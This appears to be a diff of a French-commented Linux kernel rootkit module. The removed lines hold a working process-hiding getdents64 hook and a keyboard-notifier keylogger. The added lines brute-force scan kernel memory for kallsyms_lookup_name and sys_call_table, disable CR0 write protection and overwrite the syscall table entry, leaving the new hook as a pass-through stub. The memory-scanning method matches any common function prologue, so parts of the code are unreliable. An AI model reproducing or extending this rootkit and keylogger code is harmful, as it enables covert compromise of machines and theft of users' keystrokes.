@@ -5,120 +5,106 @@
 #include <linux/dirent.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
-#include <linux/namei.h>
 #include <linux/version.h>
-#include <linux/kbd_kern.h>
-#include <linux/keyboard.h>
-#include <linux/input.h>
+#include <linux/string.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez");
 MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré");
 
-// Déclaration de kallsyms_lookup_name
-static unsigned long (*kallsyms_lookup_name)(const char *name);
-
-unsigned long *syscall_table;
+static unsigned long *syscall_table = NULL;
+static unsigned long (*my_kallsyms_lookup_name)(const char *name) = NULL;
 
 // Pointeurs pour stocker les adresses des fonctions d'origine
 asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);
-asmlinkage int (*original_sys_open)(const char __user *, int, umode_t);
 
-// Buffer pour stocker les frappes de clavier
-static char keystroke_buffer[1024];
-static int buffer_index = 0;
+// Déclaration de hooked_getdents
+asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
-// Fonction hookée pour getdents
-asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
-    int nread;
-    struct linux_dirent64 *d, *kdirent, *prev = NULL;
-    unsigned long offset = 0;
+// Fonction de recherche brute pour kallsyms_lookup_name
+static unsigned long find_kallsyms_lookup_name_auto(void) {
+    unsigned long start = 0xffffffff80000000; // Début typique de la mémoire du noyau
+    unsigned long end = 0xffffffffa0000000;   // Fin typique du segment text du noyau
+    unsigned char kallsyms_pattern[] = {0x55, 0x48, 0x89, 0xe5}; // Prologue typique : push rbp; mov rbp, rsp
+    unsigned long *ptr;
 
-    nread = original_getdents(fd, dirp, count);
-    if (nread <= 0)
-        return nread;
-
-    kdirent = kzalloc(nread, GFP_KERNEL);
-    if (kdirent == NULL)
-        return nread;
-
-    if (copy_from_user(kdirent, dirp, nread)) {
-        kfree(kdirent);
-        return nread;
-    }
-
-    while (offset < nread) {
-        d = (struct linux_dirent64 *)((char *)kdirent + offset);
-        if (strstr(d->d_name, "hidden_process")) {
-            if (prev)
-                prev->d_reclen += d->d_reclen;
-            else
-                memmove(d, (char *)d + d->d_reclen, (nread - offset - d->d_reclen));
-            nread -= d->d_reclen;
-        } else {
-            prev = d;
+    for (ptr = (unsigned long *)start; ptr < (unsigned long *)end; ptr++) {
+        if (memcmp((void *)ptr, kallsyms_pattern, sizeof(kallsyms_pattern)) == 0) {
+            printk(KERN_INFO "kallsyms_lookup_name trouvé à l'adresse : %p\n", ptr);
+            return (unsigned long)ptr;
         }
-        offset += d->d_reclen;
     }
 
-    if (copy_to_user(dirp, kdirent, nread)) {
-        kfree(kdirent);
-        return nread;
-    }
-
-    kfree(kdirent);
-    return nread;
+    printk(KERN_ALERT "kallsyms_lookup_name introuvable\n");
+    return 0;
 }
 
-// Fonction pour enregistrer les frappes de clavier
-static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
-    struct keyboard_notifier_param *param = _param;
-    
-    if (code == KBD_KEYSYM && param->down) {
-        keystroke_buffer[buffer_index++] = param->value;
-        if (buffer_index >= sizeof(keystroke_buffer))
-            buffer_index = 0; // Reset buffer if full
+// Fonction de recherche brute de syscall_table
+static unsigned long *find_syscall_table(void) {
+    unsigned long start = 0xffffffff80000000; // Début typique de la mémoire du noyau
+    unsigned long end = 0xffffffffa0000000;   // Fin typique du segment text
+    unsigned long *addr;
+
+    for (addr = (unsigned long *)start; addr < (unsigned long *)end; addr++) {
+        if (addr[__NR_close] == (unsigned long)my_kallsyms_lookup_name("sys_close")) {
+            return addr;
+        }
     }
 
-    return NOTIFY_OK;
+    printk(KERN_ALERT "syscall_table introuvable\n");
+    return NULL;
 }
-
-// Structure pour enregistrer le keylogger
-static struct notifier_block keylogger_notifier = {
-    .notifier_call = keylogger_notify
-};
 
 static int __init rootkit_init(void) {
+    unsigned long cr0;
+
     printk(KERN_INFO "Rootkit loaded\n");
 
-    // Localisation de kallsyms_lookup_name
-    kallsyms_lookup_name = (void *)kallsyms_lookup_name("kallsyms_lookup_name");
+    // Recherche automatique de kallsyms_lookup_name
+    my_kallsyms_lookup_name = (void *)find_kallsyms_lookup_name_auto();
+    if (!my_kallsyms_lookup_name) {
+        printk(KERN_ALERT "kallsyms_lookup_name introuvable\n");
+        return -1;
+    }
 
-    // Localisation de la table des appels système
-    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    // Recherche de syscall_table
+    syscall_table = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
+    if (!syscall_table) {
+        printk(KERN_ALERT "syscall_table introuvable via kallsyms. Tentative de recherche brute.\n");
+        syscall_table = find_syscall_table();
+    }
 
-    // Localisation des adresses des fonctions d'origine
-    write_cr0(read_cr0() & (~0x10000));
-    original_getdents = (void*)syscall_table[__NR_getdents64];
+    if (!syscall_table) {
+        printk(KERN_ALERT "Impossible de localiser sys_call_table. Rootkit non chargé.\n");
+        return -1;
+    }
+
+    // Hook de getdents64
+    cr0 = read_cr0();
+    write_cr0(cr0 & ~0x10000); // Désactiver la protection d'écriture
+    original_getdents = (void *)syscall_table[__NR_getdents64];
     syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents;
-    write_cr0(read_cr0() | 0x10000);
+    write_cr0(cr0); // Réactiver la protection d'écriture
 
-    // Enregistrer le notifier pour le keylogger
-    register_keyboard_notifier(&keylogger_notifier);
-
+    printk(KERN_INFO "Hook de getdents64 installé\n");
     return 0;
 }
 
 static void __exit rootkit_exit(void) {
-    // Restauration des adresses des fonctions d'origine
-    write_cr0(read_cr0() & (~0x10000));
+    unsigned long cr0;
+
+    // Restauration de getdents64
+    cr0 = read_cr0();
+    write_cr0(cr0 & ~0x10000); // Désactiver la protection d'écriture
     syscall_table[__NR_getdents64] = (unsigned long)original_getdents;
-    write_cr0(read_cr0() | 0x10000);
+    write_cr0(cr0); // Réactiver la protection d'écriture
 
-    // Désenregistrer le notifier pour le keylogger
-    unregister_keyboard_notifier(&keylogger_notifier);
+    printk(KERN_INFO "Rootkit déchargé\n");
+}
 
-    printk(KERN_INFO "Rootkit unloaded\n");
+asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
+    // Implémentation de hooked_getdents
+    return original_getdents(fd, dirp, count);
 }
 
 module_init(rootkit_init);
